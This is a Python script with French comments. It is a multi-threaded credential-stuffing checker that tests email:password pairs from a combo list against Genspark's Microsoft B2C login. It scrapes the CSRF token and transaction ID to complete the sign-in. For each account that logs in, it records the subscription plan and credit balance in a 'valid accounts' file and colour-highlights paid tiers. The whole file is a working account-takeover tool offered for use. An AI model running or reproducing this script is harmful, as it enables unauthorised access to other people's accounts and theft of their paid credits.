import requests
import re
import json
import os
import threading
from queue import Queue
from time import sleep

# --- VARIABLES DE CONFIGURATION ---
NUM_THREADS = 30
COMBO_FILE = "combo.txt"
VALID_ACCOUNTS_FILE = "comptes_valides.txt"
INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"

# --- Définition des couleurs pour le terminal ---
class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    RESET   = '\033[0m'

# Lock pour synchroniser l'accès aux fichiers et aux compteurs
file_lock   = threading.Lock()
combo_queue = Queue()

# --- Compteurs pour le suivi de la progression ---
checked_count  = 0
valid_count    = 0
total_accounts = 0

# --- URLs ---
USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"


def get_plan_and_balance(session):
    """
    Appelle les deux APIs Genspark après une connexion réussie.
    La session contient déjà le cookie session_id posé par /api/auth.
    """
    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}

    # 1. GET /api/user  →  plan + interval
    try:
        r = session.get(USER_URL, timeout=10)
        if r.status_code == 200:
            data = r.json()
            info['plan']     = data.get("personal_plan")                          or \
                               data.get("data", {}).get("personal_plan")          or "N/A"
            info['interval'] = data.get("personal_paid_sub_interval")             or \
                               data.get("data", {}).get("personal_paid_sub_interval") or "N/A"
    except Exception:
        pass

    # 2. GET /api/payment/get_credit_balance  →  balance
    try:
        r = session.get(BALANCE_URL, timeout=10)
        if r.status_code == 200:
            data    = r.json()
            # {"status":0,"message":"success","data":{"balance":9717}}
            balance = data.get("data", {}).get("balance")
            if balance is not None:
                info['balance'] = str(balance)
    except Exception:
        pass

    return info


def check_account(email, password):
    """
    Connexion complète en 3 étapes :
      1. GET  authorize  → récupère csrf + transId
      2. POST SelfAsserted  → vérifie email/mot de passe
      3. GET  confirmed  → redirige vers https://www.genspark.ai/api/auth
                           qui pose le cookie session_id sur genspark.ai

    Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/108.0.0.0 Safari/537.36'
        ),
    })

    try:
        # ── Étape 1 : authorize ────────────────────────────────────────────
        start_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "b2c_1_new_login/oauth2/v2.0/authorize"
            "?client_id=536a4e98-fd24-4cbc-a67b-417e209e0080"
            "&response_type=code"
            "&redirect_uri=https%3A%2F%2Fwww.genspark.ai%2Fapi%2Fauth"
            "&scope=email+offline_access+openid+profile"
            "&state=xpwmrIPnDhMBjJGO"
            "&code_challenge=fV3lU4JOuBYIqOZD-9fy0xvjjMvodCQG1IwZ1FrjFgo"
            "&code_challenge_method=S256"
            "&nonce=adb5015c40192345d6552754ba3a75adeefff70a6c9407554e91ee523d879d13"
            "&client_info=1&prompt=login"
        )
        r1 = session.get(start_url, timeout=10)

        settings_match = re.search(r'var SETTINGS = ({.*?});', r1.text, re.DOTALL)
        if not settings_match:
            return 'ERROR_SETTINGS', None

        settings_data  = json.loads(settings_match.group(1))
        csrf_token     = settings_data['csrf']
        transaction_id = settings_data['transId']

        # ── Étape 2 : SelfAsserted POST ────────────────────────────────────
        login_post_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "B2C_1_new_login/SelfAsserted"
        )
        query_params = {'tx': transaction_id, 'p': 'B2C_1_new_login'}
        payload      = {'request_type': 'RESPONSE', 'email': email, 'password': password}
        post_headers = {
            'x-csrf-token'    : csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin'          : 'https://login.genspark.ai',
            'Referer'         : r1.url,
        }

        r2 = session.post(
            login_post_url,
            params=query_params,
            headers=post_headers,
            data=payload,
            timeout=10
        )

        if r2.status_code != 200:
            return 'ERROR_UNEXPECTED_RESPONSE', None

        r2_data = r2.json()

        if r2_data.get("status") == "400":
            message = r2_data.get("message", "")
            if "Your password is incorrect" in message:
                return 'WRONG_PASSWORD', None
            if "We can't seem to find your account" in message:
                return 'ACCOUNT_NOT_FOUND', None
            return 'ERROR_API', None

        if r2_data.get("status") != "200":
            return 'ERROR_API', None

        # ── Étape 3 : confirmed → redirige vers /api/auth → pose session_id ─
        confirm_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
            f"?rememberMe=false&csrf_token={csrf_token}"
            f"&tx={transaction_id}&p=B2C_1_new_login"
        )
        # allow_redirects=True : suit la chaîne de redirections jusqu'à genspark.ai
        # qui pose le cookie session_id dans la session
        r3 = session.get(confirm_url, timeout=15, allow_redirects=True)

        # Vérification que le cookie session_id est bien présent sur genspark.ai
        if not session.cookies.get('session_id', domain='www.genspark.ai') \
           and 'session_id' not in session.cookies:
            return 'ERROR_NO_SESSION', None

        # Mettre à jour le User-Agent et le Referer pour les appels API suivants
        session.headers.update({
            'Referer': 'https://www.genspark.ai/',
            'Origin' : 'https://www.genspark.ai',
        })

        return 'SUCCESS', session

    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError):
        return 'ERROR_NETWORK_OR_PARSE', None


def worker():
    """Vérifie un compte, récupère plan + balance si valide, affiche le statut."""
    global checked_count, valid_count, total_accounts

    while not combo_queue.empty():
        try:
            line = combo_queue.get_nowait()
        except Exception:
            break

        line = line.strip()
        if not line or ':' not in line:
            combo_queue.task_done()
            continue

        email, password = line.split(':', 1)

        result_code, session = check_account(email, password)

        with file_lock:
            checked_count += 1

            if result_code == 'SUCCESS':
                valid_count += 1

                # ── Récupération du plan et du solde ──────────────────────
                info     = get_plan_and_balance(session)
                plan     = info['plan']
                interval = info['interval']
                balance  = info['balance']

                # Ligne sauvegardée dans le fichier valide
                save_line = (
                    f"{line} | "
                    f"Plan: {plan} | "
                    f"Interval: {interval} | "
                    f"Balance: {balance}"
                )
                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(save_line + "\n")

                # Couleur selon le plan
                if plan == 'pro':
                    plan_color = Colors.MAGENTA
                elif plan == 'plus':
                    plan_color = Colors.GREEN
                else:
                    plan_color = Colors.YELLOW

                message = (
                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                )

            else:
                if result_code == 'WRONG_PASSWORD':
                    error_msg = "Mot de passe incorrect"
                elif result_code == 'ACCOUNT_NOT_FOUND':
                    error_msg = "Compte introuvable"
                else:
                    error_msg = f"Erreur ({result_code})"

                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(line + "\n")

            status_line = f"[{checked_count}/{total_accounts}] [Valides: {valid_count}]"
            print(f"{status_line} {line}  ->  {message}")

        combo_queue.task_done()


# --- Point d'entrée principal du script ---
if __name__ == "__main__":
    if not os.path.exists(COMBO_FILE):
        print(f"{Colors.RED}ERREUR : Le fichier '{COMBO_FILE}' est introuvable.{Colors.RESET}")
        exit()

    open(VALID_ACCOUNTS_FILE, 'w').close()
    open(INVALID_ACCOUNTS_FILE, 'w').close()

    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if ':' in line.strip()]
        for line in lines:
            combo_queue.put(line)

    total_accounts = len(lines)

    if total_accounts == 0:
        print(f"{Colors.YELLOW}Le fichier '{COMBO_FILE}' est vide ou mal formaté.{Colors.RESET}")
        exit()

    print(f"--- Lancement de la vérification de {total_accounts} comptes avec {NUM_THREADS} threads ---")

    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        threads.append(thread)

    combo_queue.join()

    print(f"\n--- Vérification terminée ---")
    invalid_count = total_accounts - valid_count
    print(f"Résultats: {valid_count} valides, {invalid_count} invalides sur {total_accounts} comptes vérifiés.")
    print(f"{Colors.GREEN}Les comptes valides ont été sauvegardés dans '{VALID_ACCOUNTS_FILE}'.{Colors.RESET}")
    print(f"{Colors.RED}Les comptes invalides ont été sauvegardés dans '{INVALID_ACCOUNTS_FILE}'.{Colors.RESET}")
